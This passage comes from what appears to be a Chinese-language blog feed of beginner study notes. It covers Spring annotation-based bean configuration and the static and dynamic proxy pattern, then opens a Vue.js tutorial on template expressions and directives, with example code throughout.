<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启注解的支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--扫描包及其子包下的类中注解--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.lzjself.pojo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建Course类并用@Component注解定义Bean。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 组件 <span class="doctag">@Component</span>定义 bean</span></span><br><span class="line"><span class="comment"> * 等价于 &lt;bean id=&quot;course&quot; class=&quot;com.lzjself.pojo.Course&quot;/&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Course</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;坤坤棒棒&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>测试</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext3.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Course</span> <span class="variable">course</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;course&quot;</span>, Course.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(course.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 控制台打印</span></span><br><span class="line"><span class="comment">     * 坤坤棒棒</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>属性注入</p>
</blockquote>
<p><font size = 3>Course类中</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 组件 <span class="doctag">@Component</span>定义 bean</span></span><br><span class="line"><span class="comment"> * 等价于 &lt;bean id=&quot;course&quot; class=&quot;com.lzjself.pojo.Course&quot;/&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Course</span> &#123;</span><br><span class="line">    <span class="comment">// 相当于配置文件中 &lt;property name=&quot;name&quot; value=&quot;坤坤棒棒&quot;/&gt;</span></span><br><span class="line">    <span class="meta">@Value(&quot;坤坤棒棒&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>如果有Set方法</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 组件 <span class="doctag">@Component</span>定义 bean</span></span><br><span class="line"><span class="comment"> * 等价于 &lt;bean id=&quot;course&quot; class=&quot;com.lzjself.pojo.Course&quot;/&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Course</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 相当于配置文件中 &lt;property name=&quot;name&quot; value=&quot;坤坤棒棒&quot;/&gt;</span></span><br><span class="line">    <span class="meta">@Value(&quot;坤坤棒棒&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>常见注解</p>
</blockquote>
<p><font size = 3>@Component 有几个衍生注解，我们在web开发中，会按照mvc三次架构分层</font></p>
<ul>
<li>@Controller：用于表现层bean定义</li>
<li>@Service：用于业务层bean定义</li>
<li>@Repository：用于数据层bean定义<br>写上这些注解，就相当于将这个类交给Spring管理装配了。 这四个注解功能都是一样的，都是代表将某个类注册到Spring中，装配Bean</li>
</ul>
<blockquote>
<p>自动装配</p>
</blockquote>
<ul>
<li>@Autowired：自动装配通过类型，名字。 如果@Autowired不能唯一自动装配上属性，则需要通过@Qualifier(value&#x3D;“xxx”)</li>
<li>@Nullable：字段标记了这个注解，说明这个字段可以为null；</li>
<li>@Resource：自动装配通过名字，类型。</li>
</ul>
<blockquote>
<p>注解作用域</p>
</blockquote>
<p><font size = 3>@Scope() 注解：设置Bean的作用域</font></p>
<ul>
<li>singleton：默认的，Spring会采用单例模式创建这个对象。一个Bean中该Bean的实例只有一个</li>
<li>prototype：多例模式。每次从容器中获取Bean时，都会创建一个新的实例，即Bean是多实例的</li>
</ul>
<p>实现CourseService和实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CourseService</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Scope(&quot;prototype&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CourseService</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font size = 3>测试</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext3.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Course</span> <span class="variable">course1</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;course&quot;</span>, Course.class);</span><br><span class="line">        <span class="type">Course</span> <span class="variable">course2</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;course&quot;</span>, Course.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(course1 == course2);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><blockquote>
<p>比如小明要租房子 他直接接触的是中介而不是房东 但是小明依旧能够租到房子 而真正出租房屋的人确实房东 此时中介起到了代理的作用</p>
</blockquote>
<p><font size = 3> 静态代理 </font></p>
<p>优点:</p>
<ul>
<li>可以使得我们的真实角色更加纯粹，不再去关注一些公共的事情 .</li>
<li>公共的业务由代理来完成，实现了业务的分工 ！</li>
<li>公共业务发生扩展的时候，方便集中管理 ！<br>缺点 :</li>
<li>类多了 , 多了代理类 , 工作量变大了 . 开发效率降低</li>
<li>一个真实角色就会产生一个代理角色；代码量就会翻倍，开发效率会变低</li>
</ul>
<p><font size = 3> 动态代理 </font></p>
<blockquote>
<p>动态代理是一种常用的设计模式，广泛应用于框架中，Spring框架的AOP特性就是应用动态代理实现的</p>
</blockquote>
<p>优点:</p>
<ul>
<li>可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情</li>
<li>公共的业务由代理来完成 . 实现了业务的分工</li>
<li>公共业务发生扩展时变得更加集中和方便</li>
<li>一个动态代理 一般代理某一类业务</li>
<li>一个动态代理可以代理多个类，代理的是接口</li>
</ul>
<p><font size = 3>实现动态代理的两种方式</font></p>
<ul>
<li>jdk动态代理：根据目标类接口获取代理类实现规则，生成代理对象。这个代理对象，也是目标类接口的一个实现类。</li>
<li>cglib动态代理：根据目标类本身获取代理类实现规则，生成代理对象。这个代理对象，也是目标类的一个子类。 （如果目标类为final，则不能使用CGLib实现动态代理）</li>
</ul>
<p><font size = 3>SpringAOP可以自动在jdk动态代理和CGLib动态代理之间进行切换，规则如下：</font></p>
<ul>
<li>如果目标对象实现了接口，采用jdk动态代理实现aop。</li>
<li>如果目标对象没有实现接口，采用CGLib动态代理实现aop。</li>
<li>如果目标对象实现了接口，但仍然想要使用CGLIB实现aop，可以手动进行配置</li>
</ul>
<p><font size = 3>总结</font></p>
<ul>
<li>静态代理代理的接口是写死的，只能代理该类接口的实现类，实现其对应的方法，真实角色都属于同一类，</li>
<li>动态代理通过反射获取被代理对象的接口类型，所以代理的对象可以是任意的，代理类都可以通过反射获取接口类型，被代理对象的方法也可以通过反射获取，</li>
<li>所以动态代理相比静态代理最大的区别就是能够代理的类型可以是任意（Object）的，而静态代理只能代理一类对象（实现相同的接口），静态代理实现了和被代理类相同的接口，而动态代理实现的是InvocationHandler ，可以通过反射实现任意类型的接口，更具灵活性。</li>
<li>AOP的底层机制就是动态代理！</li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><font size = 3>创建一个接口</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RentHouse</span> &#123;</span><br><span class="line">    <span class="comment">// 租房的接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rentHouse</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>创建对应的实现类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentHouseImpl</span> <span class="keyword">implements</span> <span class="title class_">RentHouse</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rentHouse</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我租到了新小窝&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="静态代理实例"><a href="#静态代理实例" class="headerlink" title="静态代理实例"></a>静态代理实例</h3><p><font size = 3>创建一个代理类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentHouseProxy</span> <span class="keyword">implements</span> <span class="title class_">RentHouse</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RentHouse RentHouse;</span><br><span class="line">    <span class="comment">//注意事final修饰的关键字 不可修改</span></span><br><span class="line">    <span class="comment">//构造函数注入，需要被代理的对象</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">RentHouseProxy</span><span class="params">(<span class="keyword">final</span> RentHouse rentHouse)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rentHouse = rentHouse;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态代理- 的实现方式</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rentHouse</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;你好中介&quot;</span>);</span><br><span class="line">        rentHouse.rentHouse();</span><br><span class="line">        System.out.println(<span class="string">&quot;新小窝真爽&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font size = 3>客户端调用</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> <span class="keyword">implements</span> <span class="title class_">RentHouse</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;******正常调用******&quot;</span>);</span><br><span class="line">        RentHouse house=<span class="keyword">new</span> <span class="title class_">RentHouseImpl</span>();</span><br><span class="line">        house.rentHouse();</span><br><span class="line"> </span><br><span class="line">        System.out.println(<span class="string">&quot;******静态代理******&quot;</span>);</span><br><span class="line">        RentHouse proxy=<span class="keyword">new</span> <span class="title class_">RentHouseProxy</span>(house);</span><br><span class="line">        proxy.rentHouse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ******正常调用******</span></span><br><span class="line"><span class="comment">// 我租到了新小窝</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// ******静态代理******</span></span><br><span class="line"><span class="comment">// 你好中介</span></span><br><span class="line"><span class="comment">// 我租到了新小窝</span></span><br><span class="line"><span class="comment">// 新小窝真爽</span></span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=blue>
至此，所有实验已完成，这是作为小白的一个小小记录，如果有帮助到你，我很开心，大佬勿喷~
当然如果对此文有问题可随时联系我哦~~~持续更新中
</td></tr></table>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue学习总结</title>
    <url>/2024/02/03/VueStudy/</url>
    <content><![CDATA[<h1 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h1><h2 id="1-vue介绍"><a href="#1-vue介绍" class="headerlink" title="1. vue介绍"></a>1. vue介绍</h2><p>渐进式JavaScript框架，易学易用，性能出色，适用场景丰富的 Web 前端框架</p>
<p><a href="https://cn.vuejs.org/">官网</a></p>
<p><strong>什么是vue？</strong></p>
<p> Vue (发音为 &#x2F;vjuː&#x2F;，类似 <strong>view</strong>) 是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、CSS 和 JavaScript 构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。 </p>
<hr>
<h2 id="2-idea配置"><a href="#2-idea配置" class="headerlink" title="2. idea配置"></a>2. idea配置</h2><ul>
<li>安装插件   vue.js</li>
<li>创建前端项目  (略)</li>
<li>导入vue.js文件</li>
</ul>
<hr>
<h2 id="3-vue语法"><a href="#3-vue语法" class="headerlink" title="3. vue语法"></a>3. vue语法</h2><h3 id="3-1-vue入门案例"><a href="#3-1-vue入门案例" class="headerlink" title="3.1 vue入门案例"></a>3.1 vue入门案例</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 胡须表达式  大胡子表达式 ，取值，展示--&gt;</span></span><br><span class="line">        &#123;&#123;username.length&#125;&#125;</span><br><span class="line">        &#123;&#123;age&#125;&#125;</span><br><span class="line">       &#123;&#123;user.age+10&#125;&#125;</span><br><span class="line">       &#123;&#123;arr.length&#125;&#125;</span><br><span class="line">       &#123;&#123;users[1].address&#125;&#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化vue对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,  <span class="comment">// 挂载点，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;  <span class="comment">// 模型数据</span></span></span><br><span class="line"><span class="language-javascript">           <span class="attr">username</span>: <span class="string">&quot;tom&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">user</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="attr">username</span>: <span class="string">&quot;jack&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">address</span>: <span class="string">&quot;bj&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">arr</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">users</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="string">&quot;jack1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">address</span>: <span class="string">&quot;bj&quot;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="string">&quot;jack2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">address</span>: <span class="string">&quot;bj2&quot;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="string">&quot;jack3&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">age</span>: <span class="number">20</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">address</span>: <span class="string">&quot;bj&quot;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 方法的地方</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-2-vue指令-很重要"><a href="#3-2-vue指令-很重要" class="headerlink" title="3.2 vue指令(很重要)"></a>3.2 vue指令(很重要)</h3><ul>
<li>v-html</li>
<li>v-text</li>
<li>v-bind</li>
<li>v-show</li>
<li>v-on</li>
<li>v-if</li>
<li>v-for</li>
<li>v-model    ——MVVM模型</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;msg&#125;&#125; <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;msg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>   <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;msg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>按钮一<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>按钮二<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;200px&quot;</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;path&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-show</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">:width</span>=<span class="string">&quot;width&quot;</span> <span class="attr">:src</span>=<span class="string">&quot;path&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;age&lt;18 &amp;&amp; age&gt;0&quot;</span>&gt;</span>未成年，可以预习java了<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else-if</span>=<span class="string">&quot;age&gt;=18 &amp;&amp; age&lt;=65&quot;</span>&gt;</span>成年了，可以学习java了<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else-if</span>=<span class="string">&quot;age&gt;65&quot;</span>&gt;</span>可以退休了。。。。<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span>输入年龄错误。。。<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(a,b) in arr&quot;</span>&gt;</span>&#123;&#123;a.username&#125;&#125;======&#123;&#123;b&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span> &gt;</span>    -------&#123;&#123;name&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 指令</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-text: 文本操作</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-html: 可以解析标签</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-bind: 属性绑定</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-show: 展示，不展示</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-on: 事件绑定指令</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-if: 判断</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-for: 循环指令</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * v-model: 双向绑定</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&quot;xx&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>: <span class="string">&quot;&lt;h1&gt;王天霸&lt;/h1&gt;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">path</span>: <span class="string">&quot;img/erha.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">width</span>: <span class="string">&quot;200px&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">flag</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">age</span>: -<span class="number">11</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">arr</span>:[</span></span><br><span class="line"><span class="language-javascript">                &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="string">&quot;张根硕1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">age</span>: <span class="number">31</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="string">&quot;张根硕2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">age</span>: <span class="number">32</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="string">&quot;张根硕3&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">age</span>: <span class="number">33</span>,</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span 